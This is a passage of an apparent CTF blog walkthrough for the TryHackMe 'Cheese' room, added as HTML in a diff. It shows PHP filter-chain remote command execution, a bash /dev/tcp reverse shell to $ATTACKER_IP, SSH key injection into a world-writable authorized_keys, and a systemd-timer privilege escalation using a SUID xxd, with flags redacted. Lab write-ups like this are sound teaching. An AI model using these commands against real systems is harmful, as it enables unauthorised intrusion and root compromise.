+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span></span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a><span class="fu">wc</span> <span class="at">-c</span> /tmp/chain-response</span>
+<span id="cb26-11"><a href="#cb26-11" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> <span class="at">-c</span> 300 /tmp/chain-response</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.50.16 PM.png" alt="Successful PHP filter-chain execution returning the www-data identity" style="max-width:100%;margin:2rem 0;">
+<p>Bam. RCE, baby.</p>
+<p>We have confirmed remote command execution as <code>www-data</code>. We’ll clean out the garbage with <code>strings</code> later.</p>
+<h2 id="the-cheese-troll">The Cheese Troll</h2>
+<p>Let’s identify the web application’s directory and contents:</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&quot;file=</span><span class="va">$CHAIN</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;cmd=pwd; ls -la&#39;</span> <span class="dt">\</span></span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span> <span class="kw">|</span></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="fu">strings</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.53.02 PM.png" alt="Remote command execution listing the web application directory" style="max-width:100%;margin:2rem 0;">
+<p>Well, I see the breadcrumb (or red herring): <code>supersecretmessageforadmin</code>. No extension. 25 bytes.</p>
+<p>Let’s read it through command execution:</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&quot;file=</span><span class="va">$CHAIN</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;cmd=cat /var/www/html/supersecretmessageforadmin&#39;</span> <span class="dt">\</span></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span> <span class="kw">|</span></span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="fu">strings</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 9.55.14 PM.png" alt="The supersecretmessageforadmin file delivering another troll message" style="max-width:100%;margin:2rem 0;">
+<p>Wow. Magnificent trolling.</p>
+<h2 id="shell-time">Shell Time</h2>
+<p>We have command execution, so let’s turn it into a reverse shell.</p>
+<p>Start the listener in a separate terminal:</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rlwrap</span> nc <span class="at">-lvnp</span> 4444</span></code></pre></div>
+<p>Then, from the terminal where <code>$CHAIN</code> exists, send the callback:</p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-sS</span> <span class="at">--get</span> <span class="dt">\</span></span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&quot;file=</span><span class="va">$CHAIN</span><span class="st">&quot;</span> <span class="dt">\</span></span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a>--data-urlencode <span class="st">&#39;cmd=bash -c &quot;bash -i &gt;&amp; /dev/tcp/$ATTACKER_IP/4444 0&gt;&amp;1&quot;&#39;</span> <span class="dt">\</span></span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a><span class="st">&quot;http://</span><span class="va">$TARGET_IP</span><span class="st">/secret-script.php&quot;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.00.12 PM.png" alt="Reverse-shell callback received by the listener" style="max-width:100%;margin:2rem 0;">
+<p>Shell time.</p>
+<p>Let’s give the shell basic terminal functionality:</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> <span class="at">-c</span> <span class="st">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">TERM</span><span class="op">=</span>xterm</span></code></pre></div>
+<p>And run the usual suspects:</p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="fu">hostname</span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /home/comte</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.02.06 PM.png" alt="Upgraded www-data shell and contents of the comte home directory" style="max-width:100%;margin:2rem 0;">
+<p>We can see the user flag, but <code>www-data</code> can’t read it…yet.</p>
+<p>Only <code>comte</code> can read and modify it, meaning it’s time to become The Big Cheese.</p>
+<p>The <code>.sudo_as_admin_successful</code> marker tells us that <code>comte</code> has successfully used <code>sudo</code> before. A sudo pivot may be in our near future.</p>
+<h2 id="becoming-the-big-cheese">Becoming The Big Cheese</h2>
+<p>The <code>.ssh</code> directory is searchable, so we’ll start there:</p>
+<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-la</span> /home/comte/.ssh</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.05.09 PM.png" alt="The comte authorized_keys file showing world-writable permissions" style="max-width:100%;margin:2rem 0;">
+<p>And we have a pivot. <code>authorized_keys</code> is world-writable.</p>
+<p>What does that mean? <code>www-data</code> can add an SSH public key that will be accepted as <code>comte</code>.</p>
+<p>In your local terminal, create a dedicated Cheese CTF key:</p>
+<div class="sourceCode" id="cb34"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh-keygen</span> <span class="at">-t</span> ed25519 <span class="at">-f</span> ~/.ssh/cheese_ctf <span class="at">-N</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/.ssh/cheese_ctf.pub</span></code></pre></div>
+<p>Copy the complete <code>ssh-ed25519 ...</code> line.</p>
+<p>Then, back in the reverse shell, append it. Replace <code>PASTE_PUBLIC_KEY_HERE</code> with the complete line:</p>
+<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="bu">printf</span> <span class="st">&#39;%s\n&#39;</span> <span class="st">&#39;PASTE_PUBLIC_KEY_HERE&#39;</span> <span class="op">&gt;&gt;</span> /home/comte/.ssh/authorized_keys</span></code></pre></div>
+<p>Confirm it landed:</p>
+<div class="sourceCode" id="cb36"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /home/comte/.ssh/authorized_keys</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.12.39 PM.png" alt="The new SSH public key appended to authorized_keys" style="max-width:100%;margin:2rem 0;">
+<p>Connect from your local terminal:</p>
+<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ssh</span> <span class="at">-i</span> ~/.ssh/cheese_ctf comte@<span class="st">&quot;</span><span class="va">$TARGET_IP</span><span class="st">&quot;</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.13.41 PM.png" alt="Successful SSH connection as comte" style="max-width:100%;margin:2rem 0;">
+<p>We are officially The Big Cheese.</p>
+<p>Let’s grab that user flag:</p>
+<div class="sourceCode" id="cb38"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="fu">id</span></span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> ~/user.txt</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.14.44 PM.png" alt="User flag retrieved as comte with the flag redacted" style="max-width:100%;margin:2rem 0;">
+<p><strong>User flag:</strong></p>
+<pre class="text"><code>THM{REDACTED}</code></pre>
+<h2 id="oddly-specific-sudo-permissions">Oddly Specific Sudo Permissions</h2>
+<p>Let’s see what <code>comte</code> can run with <code>sudo</code>:</p>
+<div class="sourceCode" id="cb40"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> <span class="at">-n</span> <span class="at">-l</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.16.02 PM.png" alt="Sudo permissions allowing specific systemctl operations on exploit.timer" style="max-width:100%;margin:2rem 0;">
+<p>These are some oddly specific sudo permissions:</p>
+<pre class="text"><code>/bin/systemctl daemon-reload
+/bin/systemctl restart exploit.timer
+/bin/systemctl start exploit.timer
+/bin/systemctl enable exploit.timer</code></pre>
+<p>A <code>systemd</code> timer activates its corresponding service. Let’s inspect both files and their permissions:</p>
+<div class="sourceCode" id="cb42"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="ex">systemctl</span> cat exploit.timer</span>
+<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a><span class="ex">systemctl</span> cat exploit.service</span>
+<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-l</span> <span class="dt">\</span></span>
+<span id="cb42-5"><a href="#cb42-5" aria-hidden="true" tabindex="-1"></a>/etc/systemd/system/exploit.<span class="pp">*</span> <span class="dt">\</span></span>
+<span id="cb42-6"><a href="#cb42-6" aria-hidden="true" tabindex="-1"></a>/lib/systemd/system/exploit.<span class="pp">*</span> <span class="dt">\</span></span>
+<span id="cb42-7"><a href="#cb42-7" aria-hidden="true" tabindex="-1"></a>2<span class="op">&gt;</span>/dev/null</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.18.28 PM.png" alt="exploit.timer and exploit.service definitions with the timer permissions" style="max-width:100%;margin:2rem 0;">
+<p>There it is. The service already contains the privilege-escalation payload:</p>
+<pre class="text"><code>copy /usr/bin/xxd to /opt/xxd
+give /opt/xxd SUID permissions</code></pre>
+<p>Yes, please do.</p>
+<p>The timer is world-writable, but its activation line is blank. We’ll edit it as <code>comte</code>:</p>
+<div class="sourceCode" id="cb44"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nano</span> /etc/systemd/system/exploit.timer</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.20.46 PM.png" alt="World-writable exploit.timer open for editing" style="max-width:100%;margin:2rem 0;">
+<p>Change:</p>
+<div class="sourceCode" id="cb45"><pre class="sourceCode ini"><code class="sourceCode ini"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="dt">OnBootSec</span><span class="ot">=</span></span></code></pre></div>
+<p>To:</p>
+<div class="sourceCode" id="cb46"><pre class="sourceCode ini"><code class="sourceCode ini"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="dt">OnActiveSec</span><span class="ot">=</span><span class="st">1s</span></span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.21.42 PM.png" alt="exploit.timer configured to activate after one second" style="max-width:100%;margin:2rem 0;">
+<p>Save and exit, then make root’s <code>systemd</code> detonate it:</p>
+<div class="sourceCode" id="cb47"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl daemon-reload</span>
+<span id="cb47-2"><a href="#cb47-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl start exploit.timer</span></code></pre></div>
+<p>Wait a second, then check <code>/opt/xxd</code>:</p>
+<div class="sourceCode" id="cb48"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb48-1"><a href="#cb48-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ls</span> <span class="at">-l</span> /opt/xxd</span></code></pre></div>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.23.19 PM.png" alt="The new xxd copy showing its SUID permissions" style="max-width:100%;margin:2rem 0;">
+<p>The SUID bit is active.</p>
+<p>We’ll use the privileged copy to read <code>/root/root.txt</code> as hexadecimal, then use the ordinary copy to turn that hex back into text:</p>
+<div class="sourceCode" id="cb49"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb49-1"><a href="#cb49-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/opt/xxd</span> /root/root.txt <span class="kw">|</span> <span class="ex">/usr/bin/xxd</span> <span class="at">-r</span></span></code></pre></div>
+<p><code>/opt/xxd</code> runs with root privileges and can read the protected file. It outputs a hexadecimal representation.</p>
+<p><code>/usr/bin/xxd -r</code> reverses the hex back into the original flag text.</p>
+<p>How’s that for a clean exit?</p>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.25.29 PM.png" alt="Root flag recovered through the SUID xxd copy with the flag redacted" style="max-width:100%;margin:2rem 0;">
+<p><strong>Root flag:</strong></p>
+<pre class="text"><code>THM{REDACTED}</code></pre>
+<h2 id="final-attack-chain">Final Attack Chain</h2>
+<pre class="text"><code>Portspoof noise
+&gt; validate real Ports 22 and 80
+&gt; ffuf discovers secret-script.php
+&gt; LFI reads /etc/passwd
+&gt; PHP filter reveals source code
+&gt; filter-chain RCE as www-data
+&gt; world-writable authorized_keys
+&gt; SSH access as comte
+&gt; world-writable systemd timer
+&gt; root service creates SUID xxd
+&gt; privileged read of root.txt</code></pre>
+<p>Cue the confetti.</p>
+<img src="/images/cheese/Screenshot 2026-09-03 at 10.27.36 PM.png" alt="TryHackMe Cheese completion screen" style="max-width:100%;margin:2rem 0;">
+</div>
+<footer class="post-footer"></footer>
+</article>
+</main>
+<footer class="footer"><span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot; <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp; <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a></span></footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"></path></svg></a>
+<script>
+let menu=document.getElementById("menu");if(menu){const p=localStorage.getItem("menu-scroll-position");if(p)menu.scrollLeft=parseInt(p,10);menu.onscroll=()=>localStorage.setItem("menu-scroll-position",menu.scrollLeft)}
+document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener("click",function(e){e.preventDefault();const id=this.getAttribute("href").substring(1);const target=document.getElementById(decodeURIComponent(id));if(target)target.scrollIntoView({behavior:window.matchMedia("(prefers-reduced-motion: reduce)").matches?"auto":"smooth"});if(id==="top")history.replaceState(null,null," ");else history.pushState(null,null,"#"+id)}));
+let topButton=document.getElementById("top-link");window.onscroll=()=>{if(document.body.scrollTop>800||document.documentElement.scrollTop>800){topButton.style.visibility="visible";topButton.style.opacity="1"}else{topButton.style.visibility="hidden";topButton.style.opacity="0"}};
+document.getElementById("theme-toggle").addEventListener("click",()=>{const html=document.documentElement;if(html.dataset.theme==="dark"){html.dataset.theme="light";localStorage.setItem("pref-theme","light")}else{html.dataset.theme="dark";localStorage.setItem("pref-theme","dark")}});
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
+</script>
+</body>
+</html>
